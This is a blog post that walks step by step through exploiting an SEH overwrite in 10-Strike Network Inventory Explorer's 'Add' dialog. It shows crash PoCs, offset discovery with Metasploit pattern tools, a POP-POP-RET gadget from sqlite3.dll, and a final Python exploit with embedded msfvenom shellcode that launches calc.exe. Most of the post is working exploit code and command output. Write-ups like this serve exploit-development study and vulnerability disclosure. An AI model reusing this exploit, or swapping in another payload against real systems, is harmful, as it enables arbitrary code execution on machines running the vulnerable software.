---
layout: post
title: 10-Strike Network Inventory Explorer 'Add' Structered Exception Handling Overwrite
date: 2020-03-24 14:31:00
categories: posts
comments: false
en: true
---

# Preamble
Today i was gathering around Exploit-DB, when i found [this](https://www.exploit-db.com/exploits/44838) exploit, so i thought of searching a vulnerability in such software.

# The Bug
10-Strike Network Inventory Explorer suffers from a Structered Exception Handling (SEH) overwrite when issuing a long command within the 'Add' parameter, meaning that arbitrary code may be executed within a crafted exploit.

Initial PoC script:

```term_session
import struct

buffer = "A" * 1000
f = open ("strike.txt", "w")
f.write(buffer)
f.close()
```

Once the exploit is executed with python, it is opened and copied to clipboard with Notepad++. In order to paste the content within the vulnerable parameter, it is gone to the 'Main tab', and the 'Add' button is selected:

![](/assets/img/Findings1/0.png)

Once this is done, the contents are pasted within the 'Computer' parameter, under 'Computer Card':

![](/assets/img/Findings1/1.png)

Seconds after this is done, the SEH Chains is overwritten:

![](/assets/img/Findings1/2.png)

A pattern is generated with msf-pattern_create:

```term_session
msf-pattern_create -l 1000 
```

![](/assets/img/Findings1/3.png)

This pattern is pasted within the previous showed parameter, overwritting the SEH Chain values with the following:

![](/assets/img/Findings1/4.png)

The nSEH value is grabbed and parsed with msf-pattern_offset:

```term_session
root@kali:~# msf-pattern_offset -q 68413068 
[*] Exact match at offset 211
root@kali:~# 
```

As seen, the offset should be 211 bytes, once this is done, the PoC is updated:

```term_session
import struct

buffer = "A" * 211 + "BBBB" + "CCCC"
f = open ("strike.txt", "w")
f.write(buffer)
f.close()
```

Upon repeating the previous process, the SEH Chains values are overwritten with the desired values:

![](/assets/img/Findings1/5.png)

Good, as now it is known that control is obtained, it is now off to find a POP-POP-RETN sequence. 

In order to find one, modules without protections are listed:

![](/assets/img/Findings1/6.png)

In this case, i will use the module 'sqlite3.dll'. 

POP POP RETN sequences are listed:

![](/assets/img/Findings1/7.png)

On this case, i chose the first address. Now, it is needed to confirm execution, this will done by adding extra values and see if those are executed.

Updated PoC:

```term_session
import struct

nseh = struct.pack("<I", 0x909006EB)
seh = struct.pack("<I", 0x61E8497A) # 0x61e8497a : pop esi # pop edi # ret  |  {PAGE_EXECUTE_READ} [sqlite3.dll] ASLR: False, Rebase:
False, SafeSEH: False, OS: False, v3.12.2 (C:\Program Files\10-Strike Network Inventory Explorer\sqlite3.dll)

buffer = "A" * 211 + nseh + seh + "\xff" * 200
f = open ("strike.txt", "w")
f.write(buffer)
f.close()
```

After the process of exploitation is once again repeated, the SEH Chains is overwritten by the short jump and POP POP RETN sequence:

![](/assets/img/Findings1/11.png)

Moreover, if SHIFT+F9 combination is pressed twice, the execution continues as desired:

![](/assets/img/Findings1/8.png)

Great! Execution has been granted, the last step is to generate some shellcode, isn't it?

![](/assets/img/Findings1/9.png)

Final PoC:

```term_session
import struct

nseh = struct.pack("<I", 0x909006EB)
seh = struct.pack("<I", 0x61E8497A) # 0x61e8497a : pop esi # pop edi # ret  |  {PAGE_EXECUTE_READ} [sqlite3.dll] ASLR: False, Rebase: 
False, SafeSEH: False, OS: False, v3.12.2 (C:\Program Files\10-Strike Network Inventory Explorer\sqlite3.dll)

# msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed 
# Payload size: 448 bytes

buf =  b""
buf += b"\x89\xe5\xdb\xd0\xd9\x75\xf4\x5d\x55\x59\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x59\x6c\x59\x78\x6b"
buf += b"\x32\x57\x70\x67\x70\x33\x30\x71\x70\x4f\x79\x58\x65"
buf += b"\x35\x61\x6b\x70\x73\x54\x4e\x6b\x30\x50\x66\x50\x4c"
buf += b"\x4b\x42\x72\x34\x4c\x4c\x4b\x46\x32\x52\x34\x6c\x4b"
buf += b"\x74\x32\x45\x78\x66\x6f\x6d\x67\x32\x6a\x37\x56\x56"
buf += b"\x51\x39\x6f\x4e\x4c\x45\x6c\x55\x31\x73\x4c\x76\x62"
buf += b"\x56\x4c\x55\x70\x6a\x61\x5a\x6f\x54\x4d\x46\x61\x78"
buf += b"\x47\x4d\x32\x69\x62\x61\x42\x62\x77\x6e\x6b\x73\x62"
buf += b"\x76\x70\x6c\x4b\x62\x6a\x57\x4c\x4e\x6b\x72\x6c\x44"
buf += b"\x51\x50\x78\x7a\x43\x33\x78\x75\x51\x6a\x71\x50\x51"
buf += b"\x4e\x6b\x66\x39\x75\x70\x46\x61\x6e\x33\x6c\x4b\x30"
buf += b"\x49\x44\x58\x6a\x43\x64\x7a\x31\x59\x4e\x6b\x65\x64"
buf += b"\x6c\x4b\x45\x51\x59\x46\x35\x61\x59\x6f\x6e\x4c\x6b"
buf += b"\x71\x78\x4f\x66\x6d\x33\x31\x6a\x67\x45\x68\x4b\x50"
buf += b"\x62\x55\x69\x66\x53\x33\x53\x4d\x49\x68\x57\x4b\x31"
buf += b"\x6d\x35\x74\x73\x45\x49\x74\x52\x78\x4e\x6b\x31\x48"
buf += b"\x64\x64\x63\x31\x5a\x73\x61\x76\x6c\x4b\x36\x6c\x50"
buf += b"\x4b\x6e\x6b\x46\x38\x55\x4c\x36\x61\x58\x53\x6e\x6b"
buf += b"\x65\x54\x6c\x4b\x75\x51\x48\x50\x6b\x39\x70\x44\x45"
buf += b"\x74\x31\x34\x31\x4b\x53\x6b\x43\x51\x30\x59\x43\x6a"
buf += b"\x73\x61\x6b\x4f\x49\x70\x63\x6f\x71\x4f\x43\x6a\x4e"
buf += b"\x6b\x57\x62\x58\x6b\x4c\x4d\x53\x6d\x73\x5a\x63\x31"
buf += b"\x4c\x4d\x6c\x45\x58\x32\x55\x50\x45\x50\x65\x50\x36"
buf += b"\x30\x61\x78\x30\x31\x4e\x6b\x52\x4f\x6d\x57\x69\x6f"
buf += b"\x4e\x35\x6d\x6b\x4c\x30\x6d\x65\x6e\x42\x31\x46\x55"
buf += b"\x38\x4e\x46\x6a\x35\x4f\x4d\x4d\x4d\x49\x6f\x68\x55"
buf += b"\x37\x4c\x43\x36\x61\x6c\x45\x5a\x6b\x30\x79\x6b\x49"
buf += b"\x70\x64\x35\x63\x35\x4d\x6b\x67\x37\x74\x53\x74\x32"
buf += b"\x62\x4f\x71\x7a\x65\x50\x53\x63\x4b\x4f\x69\x45\x42"
buf += b"\x43\x33\x51\x70\x6c\x42\x43\x36\x4e\x73\x55\x51\x68"
buf += b"\x65\x35\x63\x30\x41\x41"

buffer = "A" * 211 + nseh + seh + "A" * 20 + buf + "\xff" * 200
f = open ("strike.txt", "w")
f.write(buffer)
f.close()
```

# EndGame 

![](/assets/img/Findings1/10.png)
